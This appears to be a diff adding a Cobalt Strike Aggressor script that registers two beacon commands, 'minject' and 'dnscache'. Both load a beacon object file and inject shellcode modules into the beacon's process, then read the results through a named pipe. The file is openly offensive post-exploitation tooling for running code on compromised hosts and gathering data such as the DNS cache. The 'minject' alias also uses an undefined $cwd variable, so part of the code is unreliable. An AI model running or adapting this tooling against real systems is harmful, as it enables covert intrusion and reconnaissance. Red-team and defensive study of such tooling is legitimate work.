@@ -1,0 +1,45 @@
+bsleep($1, 0, 0);
+
+
+beacon_command_register(
+    "minject", 
+    "Injects a shellcode module and get the output via NamedPipe.", 
+    "Synopsis: minject"
+);
+
+alias minject { 
+    $pid = binfo($1, "pid");
+    local('$handle $data');
+    $handle = openf(script_resource("piper.x64.o"));
+    $data = readb($handle, -1);
+    closef($handle);
+
+    btask($1, "Waiting for module named pipe.");
+    beacon_inline_execute($1, $data, "go");
+    btask($1, "Injecting Module.");
+    bshinject($1, $pid, "x64", $cwd . "\\minject\\" . $2 . ".bin");
+}
+
+
+
+beacon_command_register(
+    "dnscache", 
+    "Reads the dnscache like ipconfig /displaydns.", 
+    "Synopsis: dnscache"
+);
+
+alias dnscache { 
+    $pid = binfo($1, "pid");
+    local('$handle $data');
+    $handle = openf(script_resource("piper.x64.o"));
+    $data = readb($handle, -1);
+    closef($handle);
+
+    # First, because NamedPipe must exist before BoF is reading it. 
+    btask($1, "Injecting Module.");
+    $cwd = cwd();
+    bshinject($1, $pid, "x64", $cwd . "\\minject\\dnscache.bin");
+
+    btask($1, "Waiting for module named pipe.");
+    beacon_inline_execute($1, $data, "go");
+}
